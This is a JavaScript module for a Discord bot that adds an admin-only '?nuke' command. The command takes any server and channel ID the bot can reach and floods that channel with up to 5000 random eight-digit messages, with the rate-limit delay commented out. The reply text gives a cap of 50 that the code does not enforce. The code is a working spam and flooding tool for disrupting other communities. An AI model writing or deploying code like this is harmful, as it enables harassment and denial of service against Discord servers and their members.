module.exports = (client) => {
  const ADMIN_SERVER_ID = '1362145548106334340';      // placeholder server ID
  const ADMIN_CHANNEL_ID = '1420420899005399131';     // placeholder admin channel ID
  const PREFIX = '?';

  client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (
      message.guild &&
      message.guild.id === ADMIN_SERVER_ID &&
      message.channel.id === ADMIN_CHANNEL_ID &&
      message.content.startsWith(PREFIX)
    ) {
      const args = message.content.slice(PREFIX.length).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      if (command === 'command') {
        message.reply('Admin command triggered! Add your logic here.');

      } else if (command === 'nuke') {
        // Usage: ?nuke serverid channelid numberOfMessages
        if (args.length < 3) {
          return message.reply('Usage: ?nuke <serverid> <channelid> <number_of_messages>');
        }

        const [targetServerId, targetChannelId, numMessagesStr] = args;
        const numMessages = parseInt(numMessagesStr, 10);

        if (isNaN(numMessages) || numMessages <= 0 || numMessages > 5000) {
          return message.reply('Please provide a valid number of messages between 1 and 50.');
        }

        try {
          const targetGuild = await client.guilds.fetch(targetServerId);
          if (!targetGuild) return message.reply('Server not found.');

          const targetChannel = targetGuild.channels.cache.get(targetChannelId)
            || await targetGuild.channels.fetch(targetChannelId).catch(() => null);
          if (!targetChannel || !targetChannel.isTextBased()) {
            return message.reply('Channel not found or is not a text channel.');
          }

          // Send the requested number of messages (each is an 8-digit random number)
          for (let i = 0; i < numMessages; i++) {
            const randomNumber = Math.floor(Math.random() * 90000000) + 10000000;
            await targetChannel.send(`${randomNumber}`);
            // Optional delay for rate limiting:
            // await new Promise(r => setTimeout(r, 500));
          }

          message.reply(`Sent ${numMessages} random 8-digit number messages to <#${targetChannelId}> in server \`${targetServerId}\`.`);

        } catch (error) {
          console.error('Error executing nuke command:', error);
          message.reply('An error occurred while trying to execute the nuke command.');
        }

      } else {
        message.reply(`Unknown admin command: ${command}`);
      }
    }
  });
};

